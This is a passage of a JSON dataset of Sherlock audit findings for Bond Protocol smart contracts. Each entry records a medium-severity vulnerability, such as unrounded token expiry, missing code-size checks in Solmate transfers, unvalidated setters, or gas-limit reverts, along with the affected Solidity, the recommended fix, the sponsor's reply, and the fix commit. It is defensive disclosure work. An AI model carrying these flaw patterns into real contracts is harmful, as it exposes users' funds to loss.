protocol\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L175-L187\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L243-L250\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L194-L212\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInclude the same rounding process in `deploy()` as is included in `_handlePayout()`:\n\n```solidity\nfunction deploy(ERC20 underlying_, uint48 expiry_)\n        external\n        override\n        nonReentrant\n        returns (uint256)\n    {\n        expiry = ((vesting_ + uint48(block.timestamp)) / uint48(1 days)) * uint48(1 days);\n        uint256 tokenId = getTokenId(underlying_, expiry_);\n        ...\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We implemented rounding of the expiry value provided to `deploy` to match the calculation in `_handlePayouts`.\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/54b6833a46b5ae4c3a3ca183b9a55ca8c1266827",
      "summary": "\nThis bug report is about Fixed Term Bond tokens which can be minted with non-rounded expiry times. The bug was found by obront and is located in the BondFixedTermTeller.sol file. The `_handlePayout()` function calculates the expiry (rounded down to the nearest day), uses this expiry to create a tokenId, and — if that tokenId doesn't yet exist — deploys it. However, if the `deploy()` function is called directly, no such rounding occurs. This creates a mismatch between the tokenId time and the real expiry time. \n\nThe bug causes a number of issues: tokens can be deployed that don't expire at the expected daily time, tokens can expire at times that don't align with the time included in the tokenId, and malicious users can pre-deploy tokens at future timestamps to \"take over\" the token for a given day and lock it at a later time stamp.\n\nThe recommendation is to include the same rounding process in `deploy()` as is included in `_handlePayout()`. This bug was fixed in https://github.com/Bond-Protocol/bonds/commit/54b6833a46b5ae4c3a3ca183b9a55ca8c1266827.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/32",
      "tags": [
        "Time Rounding"
      ],
      "finders": [
        "obront",
        "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/32"
      ]
    },
    {
      "id": "3540",
      "title": "M-14: Solmate safetransfer and safetransferfrom does not check the code size of the token address, which may lead to funding loss",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/8 \r\n\r\n## Found by \r\nBnke0x0, 8olidity\r\n\r\n## Summary\r\n\r\n## Vulnerability Detail\r\n\r\n## Impact\r\nthe safetransfer and safetransferfrom don't check the existence of code at the token address. This is a known issue while using solmate's libraries. Hence this may lead to miscalculation of funds and may lead to loss of funds, because if safetransfer() and safetransferfrom() are called on a token address that doesn't have a contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds have been transferred successfully, and records will be accordingly calculated, but in reality, funds were never transferred. So this will lead to miscalculation and possibly loss of funds\r\n\r\n## Code Snippet\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseCallback.sol#L143\r\n\r\n        'token_.safeTransfer(to_, amount_);'\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseCallback.sol#L152\r\n\r\n\r\n           'token_.safeTransferFrom(msg.sender, address(this), amount_);'\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseTeller.sol#L108\r\n\r\n\r\n         'token.safeTransfer(to_, send);'\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseTeller.sol#L187\r\n\r\n\r\n          'quoteToken.safeTransferFrom(msg.sender, address(this), amount_);'\r\n\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseTeller.sol#L195\r\n\r\n\r\n            'quoteToken.safeTransfer(callbackAddr, amountLessFee);'\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseTeller.sol#L210\r\n\r\n\r\n            'payoutToken.safeTransferFrom(owner, address(this), payout_);'\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseTeller.sol#L214\r\n\r\n\r\n                'quoteToken.safeTransfer(owner, amountLessFee);'\r\n\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedExpiryTeller.sol#L89\r\n\r\n\r\n          'underlying_.safeTransfer(recipient_, payout_);'\r\n\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedExpiryTeller.sol#L114\r\n\r\n\r\n           'underlying_.safeTransferFrom(msg.sender, address(this), amount_);'\r\n\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedExpiryTeller.sol#L152\r\n\r\n\r\n        'underlying.safeTransfer(msg.sender, amount_);'\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L90\r\n\r\n\r\n          'payoutToken_.safeTransfer(recipient_, payout_);'\r\n\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L114\r\n\r\n\r\n                'underlying_.safeTransferFrom(msg.sender, address(this), amount_);'\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L151\r\n\r\n\r\n                'meta.underlying.safeTransfer(msg.sender, amount_);'\r\n\r\n\r\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondSampleCallback.sol#L42\r\n\r\n\r\n          'payoutToken_.safeTransfer(msg.sender, outputAmount_);'\r\n\r\n## Tool used\r\n\r\nManual Review\r\n\r\n## Recommendation\r\nUse openzeppelin's safeERC20 or implement a code existence check\r\n\r\n## Discussion\r\n\r\n**Evert0x**\r\n\r\nMessage from sponsor\r\n\r\n----\r\n\r\nAgree. We implemented a code size check in the TransferHelper.sol library to fix this.\r\n\r\n\r\n\r\n**xiaoming9090**\r\n\r\nFixed in https://github.com/Bond-Protocol/bonds/commit/a247783a240cb7fe6fb25fa19ab9385c025f8e4f",
      "summary": "This bug report is about an issue in the Solmate safetransfer and safetransferfrom functions, where the code size of the token address is not checked, which can lead to a loss of funds. The bug was found by Bnke0x0 and 8olidity and was fixed by Evert0x and xiaoming9090 with the help of the TransferHelper.sol library and a code size check. \r\n\r\nThe issue was found in the BondBaseCallback.sol, BondBaseTeller.sol, BondFixedExpiryTeller.sol, BondFixedTermTeller.sol and BondSampleCallback.sol files. The code snippets for the same can be found in the report. \r\n\r\nThe impact of this bug can be a miscalculation of funds and a possible loss of funds. This is because if safetransfer() and safetransferfrom() are called on a token address that doesn't have a contract in it, it will always return success, bypassing the return value check. So the protocol will think that funds have been transferred successfully, but in reality, they were never transferred. \r\n\r\nThe recommendation to fix this issue is to use openzeppelin's safeERC20 or implement a code existence check. The bug was fixed by Evert0x and xiaoming9090 with the help of the TransferHelper.sol library and a code size check.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/8",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/8",
      "tags": [
        "SOLMate",
        "safeTransfer - code size check"
      ],
      "finders": [
        "8olidity",
        "Bnke0x0"
      ]
    },
    {
      "id": "3539",
      "title": "M-15: meta.tuneBelowCapacity param is not updated when BondBaseSDA.setIntervals is called",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/9 \n\n## Found by \nrvierdiiev\n\n## Summary\nWhen BondBaseSDA.setIntervals function is called then meta.tuneBelowCapacity param is not updated which has impact on price tuning.\n## Vulnerability Detail\nBondBaseSDA.setIntervals function allows for market owner to change some market interval. One of them is `meta.tuneInterval`.\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L303-L333\n```solidity\n    function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n        // Check that the market is live\n        if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n\n        // Check that the intervals are non-zero\n        if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0)\n            revert Auctioneer_InvalidParams();\n\n\n        // Check that tuneInterval >= tuneAdjustmentDelay\n        if (intervals_[0] < intervals_[1]) revert Auctioneer_InvalidParams();\n\n\n        BondMetadata storage meta = metadata[id_];\n        // Check that tuneInterval >= depositInterval\n        if (intervals_[0] < meta.depositInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that debtDecayInterval >= minDebtDecayInterval\n        if (intervals_[2] < minDebtDecayInterval) revert Auctioneer_InvalidParams();\n\n\n        // Check that sender is market owner\n        BondMarket memory market = markets[id_];\n        if (msg.sender != market.owner) revert Auctioneer_OnlyMarketOwner();\n\n\n        // Update intervals\n        meta.tuneInterval = intervals_[0];\n        meta.tuneIntervalCapacity = market.capacity.mulDiv(\n            uint256(intervals_[0]),\n            uint256(terms[id_].conclusion) - block.timestamp\n        ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n        meta.tuneAdjustmentDelay = intervals_[1];\n        meta.debtDecayInterval = intervals_[2];\n    }\n```\n`meta.tuneInterval` has impact on `meta.tuneIntervalCapacity`. That means that when you change tuning interval you also change the capacity that is operated during tuning.\nThere is also one more param that depends on this, but is not counted here.\n\nThis is `meta.tuneBelowCapacity` param and it is needed to say if the market has overselled tokens. In another words it says if `meta.tuneIntervalCapacity` is already sold. This param is checked while tuning and then is updated after the tuning.\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L576-L621        \n```solidity\n        if (\n            (market.capacity < meta.tuneBelowCapacity && timeNeutralCapacity < initialCapacity) ||\n            (time_ >= meta.lastTune + meta.tuneInterval && timeNeutralCapacity > initialCapacity)\n        ) {\n            // Calculate the correct payout to complete on time assuming each bond\n            // will be max size in the desired deposit interval for the remaining time\n            //\n            // i.e. market has 10 days remaining. deposit interval is 1 day. capacity\n            // is 10,000 TOKEN. max payout would be 1,000 TOKEN (10,000 * 1 / 10).\n            markets[id_].maxPayout = capacity.mulDiv(uint256(meta.depositInterval), timeRemaining);\n\n\n            // Calculate ideal target debt to satisty capacity in the remaining time\n            // The target debt is based on whether the market is under or oversold at this point in time\n            // This target debt will ensure price is reactive while ensuring the magnitude of being over/undersold\n            // doesn't cause larger fluctuations towards the end of the market.\n            //\n            // Calculate target debt from the timeNeutralCapacity and the ratio of debt decay interval and the length of the market\n            uint256 targetDebt = timeNeutralCapacity.mulDiv(\n                uint256(meta.debtDecayInterval),\n                uint256(meta.length)\n            );\n\n\n            // Derive a new control variable from the target debt\n            uint256 controlVariable = terms[id_].controlVariable;\n            uint256 newControlVariable = price_.mulDivUp(market.scale, targetDebt);\n\n\n            emit Tuned(id_, controlVariable, newControlVariable);\n\n\n            if (newControlVariable < controlVariable) {\n                // If decrease, control variable change will be carried out over the tune interval\n                // this is because price will be lowered\n                uint256 change = controlVariable - newControlVariable;\n                adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true);\n            } else {\n                // Tune up immediately\n                terms[id_].controlVariable = newControlVariable;\n                // Set current adjustment to inactive (e.g. if we are re-tuning early)\n                adjustments[id_].active = false;\n            }\n\n\n            metadata[id_].lastTune = time_;\n            metadata[id_].tuneBelowCapacity = market.capacity > meta.tuneIntervalCapacity\n                ? market.capacity - meta.tuneIntervalCapacity\n                : 0;\n            metadata[id_].lastTuneDebt = targetDebt;\n        }\n```\n\nIf you don't update `meta.tuneBelowCapacity` when changing intervals you have a risk, that price will not be tuned when tuneIntervalCapacity was decreased or it will be still tuned when tuneIntervalCapacity was increased.\n\nAs a result tuning will not be completed when needed.\n## Impact\nTuning logic will not be completed when needed.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nUpdate meta.tuneBelowCapacity in BondBaseSDA.setIntervals function.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We added a line to set meta.tuneBelowCapacity in the setIntervals function to fix this.\n\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/bfd9eea0cc035b3ef1cca4072356f83695f960eb",
      "summary": "\nA bug was found in BondBaseSDA.setIntervals function, which is used to change some market interval, where the meta.tuneBelowCapacity param is not updated. This param is needed to say if the market has overselled tokens, and is checked while tuning and then is updated after the tuning. If it is not updated, then tuning logic will not be completed when needed, which could have a negative impact. The bug was fixed by adding a line to set meta.tuneBelowCapacity in the setIntervals function. This was done by Evert0x and then Xiaoming9090 verified the fix.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/9",
      "tags": [
        "Parameter Setter"
      ],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3538",
      "title": "M-14: BondAggregator.liveMarketsBy eventually will revert because of block gas limit",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/10 \n\n## Found by \nrvierdiiev\n\n## Summary\nBondAggregator.liveMarketsBy eventually will revert because of block gas limit\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L259-L280\n```solidity\n    function liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n        uint256 count;\n        IBondAuctioneer auctioneer;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ++count;\n            }\n        }\n\n\n        uint256[] memory ids = new uint256[](count);\n        count = 0;\n        for (uint256 i; i < marketCounter; ++i) {\n            auctioneer = marketsToAuctioneers[i];\n            if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n                ids[count] = i;\n                ++count;\n            }\n        }\n\n\n        return ids;\n    }\n```\nBondAggregator.liveMarketsBy function is looping through all markets and does at least `marketCounter` amount of external calls(when all markets are not live) and at most 4 * `marketCounter` external calls(when all markets are live and owner matches. This  all consumes a lot of gas, even that is called from view function. And each new market increases loop size.\n\nThat means that after some time `marketsToAuctioneers` mapping will be big enough that the gas amount sent for view/pure function will be not enough to retrieve all data(50 million gas according to [this](https://ethereum.stackexchange.com/questions/9824/can-solidity-view-pure-functions-be-arbitrarily-complex)). So the function will revert.\n\nAlso similar problem is with `findMarketFor`, `marketsFor` and `liveMarketsFor` functions.\n## Impact\nFunctions will always revert and whoever depends on it will not be able to get information.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nRemove not active markets or some start and end indices to functions.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We added start and stop indices to the BondAggregator.liveMarketsBy function to allow pagination through the bond markets and avoid the block gas limit.\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/5a2a9a982f3bdfc31d22f72d270bf2d556096281",
      "summary": "\nA bug report was filed on the BondAggregator.liveMarketsBy function, which is a view function that loops through all markets and does external calls. The bug is that the function eventually will revert because of the block gas limit, meaning that it will not be able to retrieve all data. This is because the gas amount sent for view/pure functions is not enough and the function will revert. This bug affects anyone who depends on the function, as it will not be able to get the information.\n\nThe bug was found by rvierdiiev and was fixed by Evert0x and xiaoming9090. Evert0x added start and stop indices to the BondAggregator.liveMarketsBy function to allow pagination through the bond markets and avoid the block gas limit. xiaoming9090 then fixed the bug in a commit.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/10",
      "tags": [
        "Gas Limit"
      ],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3537",
      "title": "M-13: BondBaseSDA.setDefaults doesn't validate inputs",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/11 \n\n## Found by \nrvierdiiev\n\n## Summary\nBondBaseSDA.setDefaults doesn't validate inputs which can lead to initializing new markets incorrectly\n## Vulnerability Detail\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L348-L356\n```solidity\n    function setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n        // Restricted to authorized addresses\n        defaultTuneInterval = defaults_[0];\n        defaultTuneAdjustment = defaults_[1];\n        minDebtDecayInterval = defaults_[2];\n        minDepositInterval = defaults_[3];\n        minMarketDuration = defaults_[4];\n        minDebtBuffer = defaults_[5];\n    }\n```\n\nFunction BondBaseSDA.setDefaults doesn't do any checkings, as you can see. Because of that it's possible to provide values that will break market functionality.\n\nFor example you can set `minDepositInterval` to be bigger than `minMarketDuration` and it will be [not possible](https://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L174-L178) to create new market.\n\nOr you can provide `minDebtBuffer` to be 100% ot 0% that will break logic of market closing.\n## Impact\nCan't create new market or market logic will be not working as designed.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nAdd input validation.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We added the following validation checks to `setDefaults`:\n- defaultTuneInterval >= defaultTuneAdjustment\n- defaultTuneInterval >= minDepositInterval\n- minMarketDuration >= minDepositInterval\n- minDebyDecayInterval >= 5 * minDepositInterval\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/141c286cccb7797f8cca68edaf9b886f12897405",
      "summary": "\nA bug has been found in BondBaseSDA.setDefaults, which is a function in the Bond Protocol. The function does not validate inputs, leading to the possibility of initializing new markets incorrectly. This would mean that it wouldn't be possible to create new markets, or the market logic would not work as designed. To fix this issue, input validation has been added to the function. This includes checks such as making sure defaultTuneInterval is greater than or equal to defaultTuneAdjustment, defaultTuneInterval is greater than or equal to minDepositInterval, minMarketDuration is greater than or equal to minDepositInterval, and minDebyDecayInterval is greater than or equal to 5 * minDepositInterval. The bug has been fixed with the commit at https://github.com/Bond-Protocol/bonds/commit/141c286cccb7797f8cca68edaf9b886f12897405.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/11",
      "tags": [
        "Validation",
        "Initialization"
      ],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3536",
      "title": "M-12: Debt Decay Faster Than Expected",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/12 \n\n## Found by \nxiaoming90\n\n## Summary\n\nThe debt decay at a rate faster than expected, causing market makers to sell bond tokens at a lower price than expected.  \n\n## Vulnerability Detail\n\nThe following definition of the debt decay reference time following any purchases at time `t` taken from the whitepaper. The second variable, which is the delay increment, is rounded up. Following is taken from Page 15 of the whitepaper - Definition 27\n\n![image-20221114170852736](https://user-images.githubusercontent.com/102820284/201844416-023c6d4f-893d-40ab-b6cb-6e33402d8e78.png)\n\nHowever, the actual implementation in the codebase differs from the specification. At Line 514, the delay increment is rounded down instead.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L514\n\n```solidity\nFile: BondBaseSDA.sol\n513:         // Set last decay timestamp based on size of purchase to linearize decay\n514:         uint256 lastDecayIncrement = debtDecayInterval.mulDiv(payout_, lastTuneDebt);\n515:         metadata[id_].lastDecay += uint48(lastDecayIncrement);\n```\n\n## Impact\n\nWhen the delay increment (TD) is rounded down, the debt decay reference time increment will be smaller than expected. The debt component will then decay at a faster rate. As a result, the market price will not be adjusted in an optimized manner, and the market price will fall faster than expected, causing market makers to sell bond tokens at a lower price than expected.\n\nFollowing is taken from Page 8 of the whitepaper - Definition 8\n\n![image-20221114173425259](https://user-images.githubusercontent.com/102820284/201844554-bdb7c975-ec4c-417f-a83e-56430300bd6e.png)\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L514\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWhen computing the `lastDecayIncrement`, the result should be rounded up.\n\n```diff\n// Set last decay timestamp based on size of purchase to linearize decay\n- uint256 lastDecayIncrement = debtDecayInterval.mulDiv(payout_, lastTuneDebt);\n+ uint256 lastDecayIncrement = debtDecayInterval.mulDivUp(payout_, lastTuneDebt);\nmetadata[id_].lastDecay += uint48(lastDecayIncrement);\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree that the rounding should be to match the specification. This was inadvertently changed when another change was implemented. Good catch.\n\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/071d2a450779dd3413224831934727dcb77e3045",
      "summary": "\nThis bug report is about an issue M-12, which was found by xiaoming90 and is related to debt decay. The debt decay is faster than expected, causing market makers to sell bond tokens at a lower price than expected. The issue was found in the whitepaper, which stated that the delay increment should be rounded up, but the actual implementation in the codebase rounds it down instead. This causes the debt component to decay at a faster rate, resulting in the market price falling faster than expected. The code snippet for this issue can be found at the BondBaseSDA.sol file at Line 514.\n\nThe bug was identified through manual review and the recommendation was to round up the delay increment when computing the lastDecayIncrement. This was fixed in the Bond-Protocol/bonds repository in the commit 071d2a450779dd3413224831934727dcb77e3045. The issue was acknowledged by the sponsor who agreed that the rounding should be to match the specification.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/12",
      "tags": [
        "Rounding"
      ],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "3535",
      "title": "M-11: Auctioneer Cannot Be Removed From The Protocol",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/13 \n\n## Found by \nxiaoming90\n\n## Summary\n\nIf a vulnerable Auctioneer is being exploited by an attacker, there is no way to remove the vulnerable Auctioneer from the protocol.\n\n## Vulnerability Detail\n\nThe protocol is missing the feature to remove an auctioneer. Once an auctioneer has been added to the whitelist, it is not possible to remove the auctioneer from the whitelist.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L62\n\n```solidity\nFile: BondAggregator.sol\n62:     function registerAuctioneer(IBondAuctioneer auctioneer_) external requiresAuth {\n63:         // Restricted to authorized addresses\n64: \n65:         // Check that the auctioneer is not already registered\n66:         if (_whitelist[address(auctioneer_)])\n67:             revert Aggregator_AlreadyRegistered(address(auctioneer_));\n68: \n69:         // Add the auctioneer to the whitelist\n70:         auctioneers.push(auctioneer_);\n71:         _whitelist[address(auctioneer_)] = true;\n72:     }\n```\n\n## Impact\n\nIn the event that a whitelisted Auctioneer is found to be vulnerable and has been actively exploited by an attacker in the wild, the protocol needs to mitigate the issue swiftly by removing the vulnerable Auctioneer from the protocol. However, the mitigation effort will be hindered by the fact there is no way to remove an Auctioneer within the protocol once it has been whitelisted. Thus, it might not be possible to stop the attacker from exploiting the vulnerable Auctioneer. The protocol team would need to find a workaround to block the attack, which will introduce an unnecessary delay to the recovery process where every second counts.\n\nAdditionally, if the admin accidentally whitelisted the wrong Auctioneer, there is no way to remove it.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L62\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider implementing an additional function to allow the removal of an Auctioneer from the whitelist, so that vulnerable Auctioneer can be removed swiftly if needed.\n\n```solidity\nfunction deregisterAuctioneer(IBondAuctioneer auctioneer_) external requiresAuth {\n    // Remove the auctioneer from the whitelist\n    _whitelist[address(auctioneer_)] = false;\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nWe acknowledge that a whitelisted Auctioneer cannot be removed from the Aggregator. Auctioneers can be sunset by disallowing new markets to be created. Adding a function to remove a whitelisted auctioneer would effectively give the protocol the ability to shutdown live, user-created markets, which goes against the goal of a permissionless system. Users have the ability to close their own markets if needed.",
      "summary": "\nThis bug report concerns the BondAggregator.sol protocol, which is missing the feature to remove an auctioneer from the whitelist. Once an auctioneer has been added, it is not possible to remove the auctioneer from the whitelist. This can be exploited by an attacker if the auctioneer is found to be vulnerable, and the protocol team would need to find a workaround to block the attack, which can cause a delay in the recovery process. Additionally, if the admin accidentally whitelisted the wrong Auctioneer, there is no way to remove it. \n\nThe recommendation is to consider implementing an additional function to allow the removal of an Auctioneer from the whitelist, so that vulnerable Auctioneer can be removed swiftly if needed. However, the sponsor has pointed out that this would give the protocol the ability to shutdown live, user-created markets, which goes against the goal of a permissionless system. Users have the ability to close their own markets if needed.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/13",
      "tags": [
        "Whitelist/Blacklist Match"
      ],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "3534",
      "title": "M-10: `BondAggregator.findMarketFor` Function Will Break In Certain Conditions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/14 \n\n## Found by \nxiaoming90\n\n## Summary\n\n`BondAggregator.findMarketFor` function will break when the `BondBaseSDA.payoutFor` function within the for-loop reverts under certain conditions.\n\n## Vulnerability Detail\n\nThe `BondBaseSDA.payoutFor` function will revert if the computed payout is larger than the market's max payout. Refer to Line 711 below.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L699\n\n```solidity\nFile: BondBaseSDA.sol\n699:     function payoutFor(\n700:         uint256 amount_,\n701:         uint256 id_,\n702:         address referrer_\n703:     ) public view override returns (uint256) {\n704:         // Calculate the payout for the given amount of tokens\n705:         uint256 fee = amount_.mulDiv(_teller.getFee(referrer_), 1e5);\n706:         uint256 payout = (amount_ - fee).mulDiv(markets[id_].scale, marketPrice(id_));\n707: \n708:         // Check that the payout is less than or equal to the maximum payout,\n709:         // Revert if not, otherwise return the payout\n710:         if (payout > markets[id_].maxPayout) {\n711:             revert Auctioneer_MaxPayoutExceeded();\n712:         } else {\n713:             return payout;\n714:         }\n715:     }\n```\n\nThe `BondAggregator.findMarketFor` function will call the `BondBaseSDA.payoutFor` function at Line 245. The `BondBaseSDA.payoutFor` function will revert if the final computed payout is larger than the `markets[id_].maxPayout` as mentioned earlier. This will cause the entire for-loop to \"break\" and the transaction to revert.\n\nAssume that the user configures the `minAmountOut_` to be `0`, then the condition `minAmountOut_ <= maxPayout`  Line 244 will always be true. The `amountIn_` will always be passed to the `payoutFor` function. In some markets where the computed payout is larger than the market's max payout, the `BondAggregator.findMarketFor` function will revert.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L221\n\n```solidity\nFile: BondAggregator.sol\n220:     /// @inheritdoc IBondAggregator\n221:     function findMarketFor(\n222:         address payout_,\n223:         address quote_,\n224:         uint256 amountIn_,\n225:         uint256 minAmountOut_,\n226:         uint256 maxExpiry_\n227:     ) external view returns (uint256) {\n228:         uint256[] memory ids = marketsFor(payout_, quote_);\n229:         uint256 len = ids.length;\n230:         uint256[] memory payouts = new uint256[](len);\n231: \n232:         uint256 highestOut;\n233:         uint256 id = type(uint256).max; // set to max so an empty set doesn't return 0, the first index\n234:         uint48 vesting;\n235:         uint256 maxPayout;\n236:         IBondAuctioneer auctioneer;\n237:         for (uint256 i; i < len; ++i) {\n238:             auctioneer = marketsToAuctioneers[ids[i]];\n239:             (, , , , vesting, maxPayout) = auctioneer.getMarketInfoForPurchase(ids[i]);\n240: \n241:             uint256 expiry = (vesting <= MAX_FIXED_TERM) ? block.timestamp + vesting : vesting;\n242: \n243:             if (expiry <= maxExpiry_) {\n244:                 payouts[i] = minAmountOut_ <= maxPayout\n245:                     ? payoutFor(amountIn_, ids[i], address(0))\n246:                     : 0;\n247: \n248:                 if (payouts[i] > highestOut) {\n249:                     highestOut = payouts[i];\n250:                     id = ids[i];\n251:                 }\n252:             }\n253:         }\n254: \n255:         return id;\n256:     }\n```\n\n## Impact\n\nThe find market feature within the protocol is broken under certain conditions. As such, users would not be able to obtain the list of markets that meet their requirements. The market makers affected by this issue will lose the opportunity to sell their bond tokens.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L699\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L221\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using try-catch or address.call to handle the revert of the `BondBaseSDA.payoutFor` function within the for-loop gracefully. This ensures that a single revert of the `BondBaseSDA.payoutFor` function will not affect the entire for-loop within the `BondAggregator.findMarketFor` function.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this finding. We implemented the try-catch suggestion without the `findMarketFor` for loop to silently handle these errors while still preserving the error for other uses.\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/56a11260c40785509215b8c81830f6270b46d15f",
